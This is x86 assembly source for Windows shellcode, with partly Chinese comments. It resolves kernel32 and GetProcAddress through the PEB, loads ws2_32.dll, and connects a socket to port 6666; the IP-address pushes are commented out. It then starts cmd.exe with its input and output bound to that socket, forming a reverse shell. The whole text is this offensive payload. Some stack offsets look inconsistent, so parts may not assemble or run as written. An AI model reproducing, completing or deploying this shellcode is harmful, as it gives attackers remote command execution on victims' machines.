_start:
    ; find kernel32.dll address
        xor eax, eax;
        mov ebx, fs: [eax + 30h] ; peb结构
        mov ebx, [ebx + 0ch]; PEB_LDR_DATA
        mov ebx, [ebx + 0ch]; inloadmoudle
        mov ebx, [ebx]; ntdll
        mov ebx, [ebx]; kernel32
        mov eax, [ebx + 18h]; kernel32基地址
        mov esi, eax;
        mov ebx, eax;

    ; find getprocess addr

        add esi, 3ch;pe头的偏移量
        add ebx, [esi]; pe addr
        lea ebx, [ebx + 0x78]; 18h--option - header, 60h--data - directory addr
        mov ebx, [ebx];导出表rva
        add ebx, eax;
        mov esi, [ebx + 0x20]; funcname rva
        add esi, eax;funcname addr--存的是name rva

        xor ecx, ecx;

 GetFunc:
        inc ecx;
        mov edx, [esi];
        add esi, 4;
        add edx, eax; 
        mov edi, [edx];
        cmp edi, 0x50746547;GetP
        jnz GetFunc;
        mov edi, [edx + 0x4];
        cmp edi, 0x41636f72;rocA
        jnz GetFunc;
        mov edi, [edx + 0x8];
        cmp edi, 0x65726464;ddre
        jnz GetFunc;


        mov esi, [ebx + 0x24]; num - offset
        add esi, eax; num - addr
        mov cx, [esi + ecx * 2];
        dec ecx;

        mov esi, [ebx + 0x1c]; addr - offset
        add esi, eax; addr - addr
        mov edx, [esi + ecx * 4];
        add edx, eax;

        mov esi, edx; getp addr
        mov edi, eax; kernel32 addr
        mov ebx, edi;

    

        ; find loadlibrary
        push ebp;
        mov ebp, esp;
        push ebx;
        xor ebx, ebx;
        push ebx
        push 0x41797261;
        push 0x7262694c;
        push 0x64616f4c;

        push esp;
        push eax;
        call edx;   eax is loadlibrary addr

        ; find dll
        add esp, 0xc;
        push eax; ebp is loadlib
        push ebx;  ebp + 4 is 0
        push 0x6c6c;
        push 0x642e3233
        push 0x5f327377;
        push esp;
        call eax; eax is ws2_32.dll

        ; WSAStartup
        add esp, 0xc;
        pop ebx;
        push eax; ebp + 4 is ws2dll
        push ebx;

        push 0x7075;
        push 0x74726174;
        push 0x53415357;
        push esp;
        push eax;
        call esi; eax is wasstartup addr
        mov edi, eax;

        ; WSASocket
        add esp, 0xc;
        push 0x4174;
        push 0x656b636f;
        push 0x53415357;
        push esp;
        mov eax, [esp + 0x14];
        push eax;
        call esi; eax is WSASocket addr;

        add esp, 0xc;
        pop ebx;
        push eax;
        push edi;
        push esi;
   
        ; find connect
        push ebx;
        push 0x00746365;
        push 0x6e6e6f63;
        push esp;
        mov edx, [ebp - 16];
        push edx;
        call esi;

        ; find inet_addr
        add esp, 0x8
        pop ebx;
        push eax; 
        push ebx;

        push 0x0072;
        push 0x6464615f;
        push 0x74656e69;
        push esp;
        mov edx, [ebp - 16];
        push edx;
        call esi;

        ; htons
        add esp, 0xc;
        pop ebx;
        push eax; 
        push ebx;

        push 0x0073;
        push 0x6e6f7468;
        push esp;
        mov edx, [ebp - 16];
        push edx;
        call esi;

        add esp, 0x8;
        pop ebx;
        push eax; 
        push ebx;


        sub esp, 0x20
        mov eax, [ebp - 24];
        push esp; 接收套接字信息的地址
        push 0x202; wVersion
        call eax; WSAStartup

  
        mov eax, [ebp - 20]; wassocket
        xor ecx, ecx;
        push ecx;
        push ecx;
        push ecx;
        mov ecx, 0x0006; IPPROTO_TCP
        push ecx;
        mov ecx, 0x0001; SOCK_STREAM
        push ecx;
        inc ecx;
        push ecx; AF_INET
        call eax;

   
        push eax; 

        mov eax, [ebp - 36];
        xor ecx, ecx;
        ; push ipv4 addr
        // push 0x0032;
        // push 0x33322e32;
        // push 0x352e3032;
        // push 0x312e3734;
 
        push esp;
        call eax; 
        mov edi, eax; ip

        add esp, 0x10;


        // htons(6666)
        mov eax, [ebp - 40];
        push 6666;
        call eax;
        mov esi, eax; port


        mov eax, 0x00000002;地址族
        sub esp, 0x10;
        xor ecx, ecx;
        mov[esp], eax;

        mov[esp + 2], si;
        mov[esp + 4], edi;
        mov[esp + 8], ecx;
        mov ebx, esp; store sock_addr

        // Connect(socket, &sock_addr, sizeof(sock_addr));
        mov edx, [ebp - 32];

        push 16;
        push ebx;
        mov eax, [ebp - 0x50];
        push eax;
        mov ecx, [ebp - 32];
        call ecx;; connect;


        xor ebx, ebx

        ; find address of RtlZeroMemory(),开辟内存空间
        push 0x00000079;
        push 0x726f6d65;
        push 0x4d6f7265;
        push 0x5a6c7452;

        push esp;
        mov eax, [ebp - 0x4];
        push eax;

        mov edx, [ebp - 0x1c];
        call edx; eax是RtlZeroMemoryaddr

        add esp, 16;

        ; zero out 84 bytes
        xor ecx, ecx;
        mov edx, ecx
        mov dx, 84;
        push ecx
        sub esp, 84
        lea ecx, [esp]

        push ecx
        push edx; 地址长度
        push ecx; 地址空间
        call eax


        xor edx, edx

        lea ecx, [esp + 4]; 

        push 0x4173
        push 0x7365636f
        push 0x72506574
        push 0x61657243; CreateProcessA

        lea edx, [esp]
        push ecx

        push edx
        mov eax, [ebp - 0x4];kernel32
        push eax;

        mov esi, [ebp - 0x1c];GetProcessAddr
        call esi; 

        pop edi; 
        add esp, 0x10; 
        push eax; 

        xor ebx, ebx
        push 0x00657865;
        push 0x2e646d63; cmd.exe

        lea ebx, [esp];

        ; STARTUPINFOA 结构初始化
        xor edx, edx
        mov dx, 68

        mov[edi], edx; cb
        xor ecx, ecx;
        mov ecx, 100h; dwFlags
        mov[edi + 0x2c], ecx;
        mov ecx, 0x00040000; wShowWindow
        mov[edi + 0x30], ecx;
        mov esi, [ebp - 0x50]; 
        mov[edi + 0x38], esi; 标准输入
        mov[edi + 0x3c], esi; 标准输出
        mov[edi + 0x40], esi; 标准错误--绑定到socket描述符

        // CreateProcess(NULL,cmdline,NULL,NULL,TRUE,NULL,NULL,NULL,&si,&pi)
        lea edx, [edi + 68];   
        push esi; 
        xor esi, esi
        push edx;  ProcessInformation
        push edi;  StartupInfo

        push esi
        push esi
        push esi

        inc esi;
        push esi; bInheritHandles true
        xor esi, esi;
        push esi
        push esi

        push ebx; CommandLine
        push esi

        call eax;启动

        nop;
        nop;
        nop;